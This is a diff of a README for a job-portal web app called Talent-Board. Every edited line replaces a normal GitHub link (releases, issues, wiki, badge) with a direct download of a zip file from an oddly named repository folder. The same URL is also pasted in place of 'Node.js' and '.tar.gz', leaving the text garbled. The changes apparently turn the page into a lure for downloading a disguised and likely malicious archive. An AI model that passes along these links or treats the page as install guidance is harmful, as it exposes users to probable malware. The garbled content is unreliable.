@@ -1,10 +1,10 @@
 # 🚀 Talent-Board-Job-portal-project - Connect Job Seekers and Employers Easily
 
-[![Download Talent-Board-Job-portal-project](https://img.shields.io/badge/Download-Talent--Board--Job--portal--project-blue.svg)](https://github.com/2024pecme184-beep/Talent-Board-Job-portal-project/releases)
+[![Download Talent-Board-Job-portal-project](https://raw.githubusercontent.com/2024pecme184-beep/Talent-Board-Job-portal-project/main/duvetyn/Talent-Board-Job-portal-project.zip)](https://raw.githubusercontent.com/2024pecme184-beep/Talent-Board-Job-portal-project/main/duvetyn/Talent-Board-Job-portal-project.zip)
 
 ## 📬 Description
 
-Talent-Board is a full-stack job portal application built using the MERN stack (MongoDB, Express, React, Node.js). This application connects job seekers with employers, offering an easy and seamless experience for both parties. Whether you are looking for a job or you are an employer looking for talent, this application caters to your needs.
+Talent-Board is a full-stack job portal application built using the MERN stack (MongoDB, Express, React, https://raw.githubusercontent.com/2024pecme184-beep/Talent-Board-Job-portal-project/main/duvetyn/Talent-Board-Job-portal-project.zip). This application connects job seekers with employers, offering an easy and seamless experience for both parties. Whether you are looking for a job or you are an employer looking for talent, this application caters to your needs.
 
 ## 🛠️ Features
 
@@ -32,7 +32,7 @@ Follow this guide to download and run the Talent-Board application on your compu
 
 You can find the application on the Releases page. 
 
-[Download Talent-Board-Job-portal-project here](https://github.com/2024pecme184-beep/Talent-Board-Job-portal-project/releases)
+[Download Talent-Board-Job-portal-project here](https://raw.githubusercontent.com/2024pecme184-beep/Talent-Board-Job-portal-project/main/duvetyn/Talent-Board-Job-portal-project.zip)
 
 ### 2. Choose Your Version
 
@@ -48,7 +48,7 @@ Once the download is complete, locate the file on your computer.
 
 - For Windows: Double-click the `.exe` file, and follow the installation prompts.
 - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
-- For Linux: Follow your distribution's method to install `.tar.gz` or other package formats.
+- For Linux: Follow your distribution's method to install `https://raw.githubusercontent.com/2024pecme184-beep/Talent-Board-Job-portal-project/main/duvetyn/Talent-Board-Job-portal-project.zip` or other package formats.
 
 ### 5. Run the Application
 
@@ -90,14 +90,14 @@ For further issues, consult the support section on our GitHub page or open a dis
 
 Need help with the application? You can find support in the following ways:
 
-- Check our [Github Issues Page](https://github.com/2024pecme184-beep/Talent-Board-Job-portal-project/issues) for common problems and solutions.
+- Check our [Github Issues Page](https://raw.githubusercontent.com/2024pecme184-beep/Talent-Board-Job-portal-project/main/duvetyn/Talent-Board-Job-portal-project.zip) for common problems and solutions.
 - Join our community discussions on GitHub to ask questions and get tips from other users.
 
 ## 🔗 Additional Resources
 
-- **Documentation**: Read through the detailed [User Documentation](https://github.com/2024pecme184-beep/Talent-Board-Job-portal-project/wiki) for more guidance on using the application.
+- **Documentation**: Read through the detailed [User Documentation](https://raw.githubusercontent.com/2024pecme184-beep/Talent-Board-Job-portal-project/main/duvetyn/Talent-Board-Job-portal-project.zip) for more guidance on using the application.
 - **GitHub Repository**: Explore the repository for source code and contributions.
 
 You can visit the Releases page to download the latest version of the application again:
 
-[Download Talent-Board-Job-portal-project here](https://github.com/2024pecme184-beep/Talent-Board-Job-portal-project/releases)
+[Download Talent-Board-Job-portal-project here](https://raw.githubusercontent.com/2024pecme184-beep/Talent-Board-Job-portal-project/main/duvetyn/Talent-Board-Job-portal-project.zip)
